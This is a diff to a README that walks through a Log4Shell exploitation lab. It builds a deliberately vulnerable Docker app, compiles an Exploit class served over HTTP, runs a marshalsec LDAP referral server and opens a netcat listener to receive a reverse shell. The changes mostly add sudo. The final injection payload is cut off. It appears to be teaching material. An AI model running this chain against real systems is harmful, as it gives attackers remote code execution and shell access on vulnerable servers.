@@ -8,15 +8,15 @@ Install docker in kali linux
 Then download the below repository
 
 ```
-git clone https://github.com/christophetd/log4shell-vulnerable-app.git
+sudo git clone https://github.com/christophetd/log4shell-vulnerable-app.git
 ```
 
 Then the run the below commands to start vulnerable web application on port 8080
 ```
-docker build . -t vulnerable-app
+sudo docker build . -t vulnerable-app
 ```
 ```
-docker run -p 8080:8080 --name vulnerable-app vulnerable-app
+sudo docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 ```
 # Creating payload and setting up python server
 
@@ -64,28 +64,33 @@ public class Exploit {
 ```
 
 Run the below command to build Exploit.class
+
+Install javac package with below command
 ```
-javac Exploit.java -source 8 -target 8
+sudo apt install default-jdk
 ```
 ```
-python3 -m http.server 8888
+sudo javac Exploit.java -source 8 -target 8
+```
+```
+sudo python3 -m http.server 8888
 ```
 # Setting up LDAP server
 ```
-git clone https://github.com/mbechler/marshalsec.git
+sudo git clone https://github.com/mbechler/marshalsec.git
 ```
 ```
-mvn package -DskipTests
+sudo mvn package -DskipTests
 ```
 ```
 cd target
 ```
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Exploit"
+sudo java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Exploit"
 ```
 setup netcat listner
 ```
-nc -lvp 9999
+sudo nc -lvp 9999
 ```
 # will execute below payload to get a shell
 ```
